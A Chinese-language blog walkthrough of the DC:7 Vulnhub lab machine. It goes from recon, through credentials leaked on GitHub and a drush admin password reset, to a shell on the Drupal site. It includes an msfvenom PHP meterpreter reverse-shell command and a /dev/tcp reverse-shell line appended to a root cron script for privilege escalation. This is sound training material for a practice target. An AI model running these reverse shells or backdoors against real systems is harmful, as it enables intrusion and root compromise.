---
title: "DC:7-Vulnhub Walkthrough"
categories: [ "安全技术" ]
tags: [ "vulnhub","靶机","walkthrough" ]
draft: false
slug: "450"
date: "2020-01-23 17:13:00"
---

[靶机地址][1]

## 工具及漏洞信息

- netdiscover
- nmap
- dirb
- dirsearch
- gobuster
- droopescan
- 计划任务提权

** 部分工具的用法和详细说明请参考此系列的第一篇文章：[bossplayersCTF:1-Vulnhub Walkthrough][2] **

## 0x00 信息收集

### 扫描靶机信息

`netdiscover`的`-r`参数扫描`192.168.1.0/16`结果如下：

![][3]

`nmap`扫描主机及端口信息：

```
nmap -sS -A -n -T4 -p- 192.168.1.8
```

![][4]

`robots.txt`没有什么可利用的，主页最下面写着`Powered by Drupal`

### 扫描路径

`dirb`扫描路径：

```
dirb http://192.168.1.8
```

![][5]

`dirsearch`

```
python3 dirsearch.py -t 50 -e .php,.txt,.zip,.html -x 400,403,404,500,503,514,564 -u http://192.168.1.8
```

![][6]

`gobuster`

```
gobuster dir -u http://192.168.1.8 -s 200,301,302 -t 50 -q -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

![][7]

## 0x01 漏洞扫描

一圈目录下来，都没什么特别的,`user/login`界面也没有弱密码：

![][8]

而且后台限制了 5 次登录失败会被暂时锁定，只能从网站框架和模板入手了

`Github`上针对`Drupal`的漏扫工具有[`droopescan`][9]和[`drupwn`][10]

但是后者不好用就不做介绍了

```
git clone https://github.com/droope/droopescan
cd droopescan
pip install -r requirements.txt
./droopescan scan drupal -u http://192.168.1.9/ -t 32
```

![][11]

而漏洞库不包含扫描出来的版本：

![][12]

`cms`本身漏洞无法利用，那我们就解决作者本身吧::quyin:OK::

## 0x01 获得普通账号

主页的底部除了`Powered by Drupal`

还有作者的名字`@DC7USER`，搜了下发现是`twitter`账号：

![][13]

并且在首页放着一个大大的`github`[链接][14]，作者只有一个仓库[`staffdb`][15]

`config.php`里明晃晃地写着账号密码和数据库名字：

![][16]

```
$servername = "localhost";
$username = "dc7user";
$password = "MdR3xOgB7#dW";
$dbname = "Staff";
```

于是用`ssh`登录进去：`ssh dc7user@192.168.1.9`，获得了`dc7user`的`shell`:

![][17]

## 0x02 获取 shell

获取到`shell`第一步当然是查看当前目录有什么文件：

![][18]

`mbox`很显眼，查看一下：

![][19]

邮件内容应该是备份的日志，调用的脚本是`/opt/scripts/backups.sh`

貌似还是`root`权限执行的。如果当前用户有脚本的写入权限，那么应该就可以提权了。

查了一下`www-data`和`root`用户才能修改，内容是用来管理`Drupal`站点的`shell`

![][20]

其中有一句话引起了我的注意：

```
drush sql-dump --result-file=/home/dc7user/backups/website.sql
```

查了一下，这个`drush`命令是可以用来修改密码的：

```
drush user-password USERNAME --password="SOMEPASSWORD"
```

于是尝试修改`admin`的密码，需要到某些指定目录例如`/var/www/html`才能修改：

![][21]

获得管理员账户之后我们登录网站来反弹`shell`

![][22]

出于安全考虑，`PHP Filter`已经从`Drupal`核心中移除

后续作为一个`module`存在，可以通过手动[下载][23]安装：

![][24]

打开网站的模块安装界面`/admin/modules`:

![][25]

![][26]

搜索模块`php`，选中我们刚才安装的`PHP`，点击`install`启动模块：

![][27]

模块安装好后就可以开始利用漏洞了，在`Content`中新建一个`Basic page`，

然后在`Title`输入页面的名称`webshell`，在`Body`中放入反弹`shell`的`PHP`代码

我这里使用`msfvenom`生成的`php shell`:

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=3333 -f raw
```

`Text format`的位置选择`PHP code`:

![][28]

弄完之后，先别操作，在`kali`上监听端口

```
msfconsole
handler -H 192.168.1.2 -P 3333 -p php/meterpreter/reverse_tcp
```

![][29]

最后点击`Preview`按钮，第一次可能不会成功，退出`Preview`再来一次即可：

![][30]

获取到的`shell`为`www-root`用户的:

![][31]

## 0x03 backups.sh 提权 root

之前邮件里的备份计划任务使用的脚本`/opt/scripts/backups.sh`只有`root`和`www-data`用户可以修改。

所以接下来就是将反弹`shell`的代码附加到`backups.sh`脚本中

（因为计划任务是`root`权限执行的，反弹回来的`shell`也会是`root`用户）

然后在`kali`中监听相应端口，等待计划任务的执行:

```
使用shell进入命令行
使用/bin/bash:python -c 'import pty;pty.spawn("/bin/bash")'
cd /opt/scripts/
在另外的终端监听指定端口:nc -lvp 3456
将反弹shell代码写进backups.sh:echo "0&lt;&amp;198-;exec 198&lt;>/dev/tcp/192.168.1.2/3456;sh &lt;&amp;198 >&amp;198 2>&amp;198" >> backups.sh
```

![][32]

等待靶机执行定时任务就可以获得`root`的`shell`:

![][33]

成功获得`flag`:

![][34]

本文完。

参考文章：

- [VULNHUB: DC:7 Vulnhub Walkthrough][35]
- [DC:7 VULNHUB WALKTHROUGH][36]
- [VulnHub 靶机系列实战教程][37]

[1]: https://www.vulnhub.com/entry/dc-7,356/
[2]: https://soapffz.com/427.html
[3]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200123_171314.png
[4]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200123_173123.png
[5]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200123_181812.png
[6]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200123_181618.png
[7]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200123_181727.png
[8]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_143103.png
[9]: https://github.com/droope/droopescan
[10]: https://github.com/immunIT/drupwn/blob/master/drupwn
[11]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_144627.png
[12]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_145444.png
[13]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_145817.png
[14]: https://github.com/Dc7User/
[15]: https://github.com/Dc7User/staffdb
[16]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_150034.png
[17]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_150417.png
[18]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_150811.png
[19]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_151055.png
[20]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_151404.png
[21]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_163352.png
[22]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_163702.png
[23]: https://www.drupal.org/project/php
[24]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_164507.png
[25]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_164725.png
[26]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_164819.png
[27]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_165521.png
[28]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_170225.png
[29]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_173222.png
[30]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_175724.png
[31]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_180129.png
[32]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_185217.png
[33]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_185352.png
[34]: https://img.soapffz.com/archives_img/2020/01/23/archives_20200209_185427.png
[35]: https://diaryof0x41.wordpress.com/2019/09/03/vulnhub-dc-7-walkthrough/
[36]: https://ethicalhackingguru.com/dc-7-vulnhub-walkthrough/
[37]: https://mp.weixin.qq.com/s/skCNWPiEPgJcHXSmsif5qQ